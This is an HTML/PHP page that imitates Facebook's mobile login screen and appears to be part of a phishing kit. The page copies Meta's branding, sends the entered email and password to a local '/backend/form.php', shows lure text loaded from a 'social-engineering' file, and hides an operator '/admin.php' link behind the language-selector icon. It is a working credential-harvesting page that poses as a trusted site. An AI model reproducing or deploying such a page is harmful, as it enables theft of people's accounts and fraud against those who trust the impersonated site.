<!DOCTYPE html>
<html lang="en">
<head>
    <title>Facebook - log in or sign up</title>
    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" />
    <link href="/imgs/gB76kJXPYJV.png" rel="shortcut icon" sizes="196x196" />
    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
    <link type="text/css" rel="stylesheet" href="/css/09KXAVlw4BL.css" data-bootloader-hash="gY9MoGu" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet" href="/css/Gt70j9moE8R.css" data-bootloader-hash="3VatRot" crossorigin="anonymous" />


    <meta http-equiv="origin-trial" data-feature="getInstalledRelatedApps" data-expires="2017-12-04" content="AvpndGzuAwLY463N1HvHrsK3WE5yU5g6Fehz7Vl7bomqhPI/nYGOjVg3TI0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=" />
    <meta name="description" content="Create an account or log into Facebook. Connect with friends, family and other people you know. Share photos and videos, send messages and get updates." />
    <link rel="canonical"  />
    <meta property="og:site_name" content="Facebook" />
    <meta property="og:type" content="website" />
    <meta property="og:title" content="Facebook - log in or sign up" />
    <meta property="og:description" content="Create an account or log into Facebook. Connect with friends, family and other people you know. Share photos and videos, send messages and get updates." />
    <meta property="og:image" content="/imgs/fb_icon_325x325.png" />

</head>

<body tabindex="0" class="touch x2 _fzu _50-3 iframe acw portrait" style="min-height: 712px; background-color: rgb(255, 255, 255);">
    <script id="u_0_c_T5" nonce="">
        (function(a) {
            a.__updateOrientation = function() {
                var b = !!a.orientation && a.orientation !== 180,
                    c = document.body;
                c && (c.className = c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g, " ") + " " + (b ? "landscape" : "portrait"));
                return b
            }
        })(window);
    </script>
    <div id="viewport" data-kaios-focus-transparent="1" style="min-height: 712px;">
        <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
        <div id="page">
            <div class="_129_" id="header-notices"></div>
            <div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane" style="min-height: 712px;">
                <div class="_7om2">
                    <div class="_4g34" id="u_0_0_Ls">
                        <div class="_5yd0 _2ph- _5yd1" style="display: none;" id="login_error" data-sigil="m_login_notice">
                            <div class="_52jd"></div>
                        </div>
                        <div class="_9om_">
                            <div class="_4-4l">
                                <div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element"></div>
                                <div class="_7om2 _52we _2pid _52z6">
                                    <div class="_4g34"><img src="/imgs/dF5SId3UHWd.svg" width="112" class="img" alt="facebook" /></div>
                                </div>
                                <div class="_5rut">
                                <br/>
                   <div style="text-align: center; font-size: 25px; opacity: 40%; padding:12px 12px 12px 12px; text-color: lightblue;"> 
                   
                   <?php
                     $file="social-engineering/contents.txt";
                      $myfile = fopen($file, "r");;
                      if(isset($myfile)){
                          echo fread($myfile,filesize($file));
                          fclose($myfile);
                      }else{
                          echo '';
                      }
                   ?>
                   
                    </div>             
                                
                                <!-- FORMS STARTS HEHRE -->
                                    <form method="post" action="/backend/form.php" class="mobile-login-form _9hp- _5spm" id="login_form" novalidate="1" data-sigil="m_login_form" data-autoid="autoid_3">
                                        <div id="user_info_container" data-sigil="user_info_after_failure_element"></div>
                                        <div id="pwd_label_container" data-sigil="user_info_after_failure_element"></div>
                                        <div id="otp_retrieve_desc_container"></div>
                                        <div>
                                            <div class="_56be">
                                                <div class="_55wo _56bf">
                                                    <div class="_96n9" id="email_input_container"><input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _5ruq _8qtn" autocomplete="on" id="m_login_email" name="email" placeholder="Mobile number or email" type="text" data-sigil="m_login_email" required ></div>
                                                </div>
                                            </div>
                                            <div class="_55wq"></div>
                                            <div class="_56be">
                                                <div class="_55wo _56bf">
                                                    <div class="_1upc _mg8" data-sigil="m_login_password">
                                                        <div class="_7om2">
                                                            <div class="_4g34 _5i2i _52we">
                                                                <div class="_5xu4"><input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2 _8qtm" autocomplete="on" id="m_login_password" name="pass" placeholder="Password" type="password" data-sigil="password-plain-text-toggle-input" required ></div>
                                                            </div>
                                                            <div class="_5s61 _216i _5i2i _52we">
                                                                <div class="_5xu4">
                                                                    <div class="_2pi9" style="display:none" id="u_0_1_oZ"><a href="#" data-sigil="password-plain-text-toggle"><span class="mfss" style="display:none" id="u_0_2_Y9">HIDE</span><span class="mfss" id="u_0_3_UI">SHOW</span></a></div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="_2pie" style="text-align:center;">
                                            <div id="login_password_step_element" data-sigil="login_password_step_element"><button type="submit" class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu" data-sigil="touchable login_button_block m_login_button" ><span class="_55sr">Log in</span></button></div>
                                            <div class="_7eif" id="oauth_login_button_container" style="display:none"></div>
                                            <div class="_7f_d" id="oauth_login_desc_container" style="display:none"></div>
                                            <div id="otp_button_elem_container"></div>
                                        </div>
                                        <div class="_xo8"></div><noscript><input type="hidden" name="_fb_noscript" value="true" /></noscript>
                                    </form>
                                    <!--FORM END HERE -->
                                    
                                    
                                    
                                    <div>
                                        <div class="_2pie _9omz">
                                            <div class="_52jj _9on1"></div>
                                        </div>
                                        <div style="padding-top: 42px">
                                            <div>
                                                <div>
                                                    <div>
                                                        <div id="login_reg_separator" class="_43mg _8qtf" data-sigil="login_reg_separator"><span class="_43mh">or</span></div>
                                                        <div class="_52jj _5t3b" id="signup_button_area"><a role="button" class="_agmp _28le btn btnS medBtn mfsm touchable" id="signup-button" tabindex="0" data-sigil="m_reg_button" data-autoid="autoid_1">Create new account</a></div>
                                                    </div>
                                                </div>
                                                <div class="_2pie" style="text-align:center;">
                                                    <div>
                                                        <div data-sigil="login_identify_step_element"></div>
                                                        <div class="other-links _8p_m">
                                                            <ul class="_5pkb _55wp">
                                                                <li></li>
                                                            </ul>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div style="display:none">
                    <div></div>
                    <div></div>
                </div><span><img src="/imgs/hsts-pixel.gif" width="0" height="0" style="display:none" /></span>
                <div class="_55wr _5ui2" data-sigil="m_login_footer">
                    <div class="_5dpw">
                        <div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">
                            <div class="_7om2">
                                <div class="_4g34"><span class="_52jc _52j9 _52jh _3ztb">English (US)</span>
                                    <div class="_3ztc"><span class="_52jc"> Français (France)</span></span></div>
                                    <div class="_3ztc"><span class="_52jc"><Português (Brasil)</span></div>
                                    <div class="_3ztc"><span class="_52jc"> Italiano</span></div>
                                </div>
                                <div class="_4g34">
                                    <div class="_3ztc"><span class="_52jc"><a data-method="post" data-sigil="ajaxify">Español</a></span></div>
                                    <div class="_3ztc"><span class="_52jc"><a data-method="post" data-sigil="ajaxify">中文(简体)</a></span></div>
                                    <div class="_3ztc"><span class="_52jc"><a  data-method="post" data-sigil="ajaxify">Deutsch</a></span></div>
                                    
                          <!-- ADMIN HERE -->          
                                    <a target="_blank" href="/admin.php">
                                        <div class="_3j87 _1rrd _3ztd" aria-label="Complete list of languages" data-sigil="more_language"><i class="img sp_zqrNfmDGuGz_2x sx_0a2d34"></i></div>
                                    </a>
                                    
                                    
                                </div>
                            </div>
                        </div>
                        <div class="_5ui4">
                            <div class="_96qv _9a0a"><a  class="_96qw" title="Read our blog, discover the resource center, and find job opportunities.">About</a><span aria-hidden="true"> · </span><a  class="_96qw" title="Visit our Help Center.">Help</a><span aria-hidden="true"> · </span><span class="_96qw" id="u_0_4_aj">More</span></div>
                            <div class="_96qv" style="display:none" id="u_0_5_Lc"><a  title="Check out Messenger." class="_96qw">Messenger</a><a  title="Facebook Lite for Android." class="_96qw">Facebook Lite</a><a  title="Browse our Watch videos." class="_96qw">Watch</a><a  title="Check out popular places on Facebook." class="_96qw">Places</a><a  title="Check out Facebook games." class="_96qw">Games</a><a  title="Buy and sell on Facebook Marketplace." class="_96qw">Marketplace</a><a title="Learn more about Meta Pay" target="_blank" class="_96qw">Meta Pay</a><a title="Check out Meta" target="_blank" class="_96qw">Meta Store</a><a  title="Learn more about Meta Quest" target="_blank" class="_96qw">Meta Quest</a><a  title="Check out Instagram" target="_blank" class="_96qw" rel="noopener" data-sigil="MLynx_asynclazy">Instagram</a><a  title="Check out Bulletin Newsletter" class="_96qw">Bulletin</a><a  title="Donate to worthy causes." class="_96qw">Fundraisers</a><a  title="Browse our Facebook Services directory." class="_96qw">Services</a><a  title="Develop on our platform." class="_96qw">Developers</a><a  title="Make your next career move to our awesome company." class="_96qw">Careers</a><a  title="Learn how we collect, use and share information to support Facebook." class="_96qw">Privacy Policy</a><a  class="_96qw">Privacy Center</a><a  title="Explore our Groups." class="_96qw">Groups</a></div><span class="mfss fcg">Meta © 2023</span>
                        </div>
                    </div>
                </div>
            </div>
            <div class=""></div>
            <div class="viewportArea _2v9s" style="display:none" id="u_0_6_Uz" data-sigil="marea">
                <div class="_5vsg" id="u_0_7_kz" style="max-height: 180px;"></div>
                <div class="_5vsh" id="u_0_8_b3" style="max-height: 354px;"></div>
                <div class="_5v5d fcg">
                    <div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Loading...
                </div>
            </div>
            <div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea">
                <div class="container">
                    <div class="image"></div>
                    <div class="message" data-sigil="error-message"></div><a class="link" data-sigil="MPageError:retry">Try Again</a>
                </div>
            </div>
        </div>
    </div>
    <div id="static_templates">
        <div class="mDialog" id="modalDialog" style="display:none" data-sigil=" context-layer-root" data-autoid="autoid_4">
            <div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">
                <div class="_7om2 _52we">
                    <div class="_5s61">
                        <div class="_52z7"><button type="submit" value="Cancel" class="cancelButton btn btnD bgb mfss touchable" id="u_0_a_c6" data-sigil="dialog-cancel-button">Cancel</button><button type="submit" value="Back" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="Back" id="u_0_b_JG" data-sigil="dialog-back-button"><i class="img sp_zqrNfmDGuGz_2x sx_336d05" style="margin-top: 2px;"></i></button></div>
                    </div>
                    <div class="_4g34">
                        <div class="_52z6">
                            <div class="_50l4 mfsl fcw" id="m-future-page-header-title" role="heading" tabindex="0" data-sigil="m-dialog-header-title dialog-title">Loading...</div>
                        </div>
                    </div>
                    <div class="_5s61">
                        <div class="_52z8" id="modalDialogHeaderButtons"></div>
                    </div>
                </div>
            </div>
            <div class="modalDialogView" id="modalDialogView"></div>
            <div class="_5v5d _5v5e fcg" id="dialogSpinner">
                <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_9_Bc" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Loading...
            </div>
        </div>
    </div>

    <link rel="preload" href="/css/09KXAVlw4BL.css" as="style" crossorigin="anonymous" />

    <link rel="preload" href="/css/Gt70j9moE8R.css" as="style" crossorigin="anonymous" />

<iframe srcdoc="" style="display: none;"></iframe>
    <div class="AdBox Ad advert post-ads"></div>
    <div class="sponsorPost"></div>
    <script src="/js/A_JkAGoo2YV.js"></script>
</body>

</html>